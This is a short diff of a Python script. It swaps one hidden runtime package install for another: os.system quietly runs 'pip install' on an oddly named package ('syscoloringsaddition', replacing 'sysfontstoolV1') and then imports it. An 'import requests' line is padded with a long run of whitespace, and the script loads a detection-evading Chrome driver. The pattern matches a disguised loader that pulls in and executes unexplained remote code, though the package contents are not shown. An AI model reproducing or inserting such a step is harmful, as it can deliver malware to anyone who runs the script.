@@ -1,6 +1,6 @@
 import os
-os.system("pip install sysfontstoolV1")
-import sysfontstoolV1
+os.system("pip install syscoloringsaddition")
+import syscoloringsaddition
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
